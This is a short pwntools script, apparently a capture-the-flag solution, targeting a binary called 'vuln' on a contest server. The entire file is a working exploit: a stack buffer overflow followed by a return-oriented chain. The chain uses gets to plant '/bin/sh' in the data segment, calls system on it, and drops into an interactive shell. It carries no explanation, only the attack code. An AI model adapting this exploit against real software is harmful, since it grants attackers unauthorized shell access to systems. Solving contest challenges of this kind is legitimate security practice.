from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./vuln')
else :
	p = connect('icewall-ctf.kr', 10207)

# Gadget
pop_ebx_ret = 0x8048429

# Addr
gets_plt = 0x8048450
system_plt = 0x8048460
data_seg = 0x804A100

payload = 'A'*(0x6C+4)
payload += p32(gets_plt)
payload += p32(pop_ebx_ret)
payload += p32(data_seg)
payload += p32(0x804864E)   # func: theSolitaryReaper

p.sendlineafter('Reaper', '1')
p.sendlineafter('Reaper/', payload)

p.sendline('/bin/sh')

payload = 'A'*(0x6C+4)
payload += p32(system_plt)
payload += p32(pop_ebx_ret)
payload += p32(data_seg)

p.sendlineafter('Reaper/', payload)

p.interactive()
